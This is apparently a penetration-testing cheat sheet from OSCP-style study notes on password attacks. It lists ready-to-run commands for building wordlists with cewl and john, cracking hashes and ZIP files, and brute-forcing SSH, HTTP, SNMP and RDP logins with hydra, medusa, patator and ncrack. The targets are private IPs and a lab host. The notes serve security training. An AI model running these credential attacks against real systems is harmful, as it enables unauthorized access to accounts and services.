# Generate custom wordlist

## Cewl - Spider and build dictionary
```
cewl -w createWordlist.txt https://www.example.com
```

## Cewl - Add minimum password length
```
cewl -w createWordlist.txt -m 6 https://www.example.com
```

## Improve the custom wordlist
```
john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
```

# Offline password cracking

## Identify hash

In kali we can use `hash-identifier` or `hashid`

## Cracking the hash

**OFFLINE**
```
hashcat --help
john --wordlist=wordlist.txt dump.txt
```

**ONLINE**
* `findmyhash LM -h 6c3d4c343f999422aad3b435b51404ee:bcd477bfdb45435a34c6a38403ca4364`
* [Crackstation](https://crackstation.net/)
* [Hashkiller](https://hashkiller.co.uk/)
* Google hashes Search pastebin.

## ZIP

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
```

# Online password cracking

## Port 22 - SSH
```
hydra -l root -P wordlist.txt 192.168.0.101 ssh
```

## Port 80/443 htaccess
```
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

## Port 80 Http Form with CSRF Token
```
patator http_fuzz url=http://monitor.bart.htb/ method=POST body='csrf=_CSRF_&user_name=Daniel&user_password=FILE0&action=login' 0=custom_wordlist.txt follow=1 accept_cookie=1 -x ignore:fgrep='The information is incorrect.' before_urls="http://monitor.bart.htb/" before_egrep='_CSRF_:name="csrf" value="(\w+)"'
```

## Port 161 - SNMP
```
hydra -P wordlist.txt -v 102.168.0.101 snmp
```

## Port 3389 - Remote Desktop Protocol
```
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
```

# References

* https://sushant747.gitbooks.io/total-oscp-guide/generate_custom_wordlist.html
* https://sushant747.gitbooks.io/total-oscp-guide/identify_hash_and_crack_it.html

